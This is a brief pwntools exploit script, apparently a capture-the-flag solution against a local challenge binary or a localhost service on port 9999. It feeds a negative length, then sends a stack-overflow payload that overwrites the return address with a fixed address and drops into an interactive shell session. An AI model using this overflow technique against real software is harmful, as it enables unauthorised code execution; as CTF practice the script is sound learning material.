from pwn import *
import sys
context.log_level = 'DEBUG'
context.terminal=["open-wsl.exe","-c"]
 
elf_dir = './pwn'
 
if(len(sys.argv) == 1):
    p = process(elf_dir)
else:
    p = remote('localhost', 9999)

#gdb.attach(p, 'b *0x401204\nc')
p.sendlineafter("how long?", '-1')

# gdb.attach(p)

p.sendlineafter("what?", b'a'*0x28 + b'b'*0x8 + b'fake_rbp' + p64(0x40123A) + b'c'*0x828 + b'b'*0x8)
 
p.interactive()
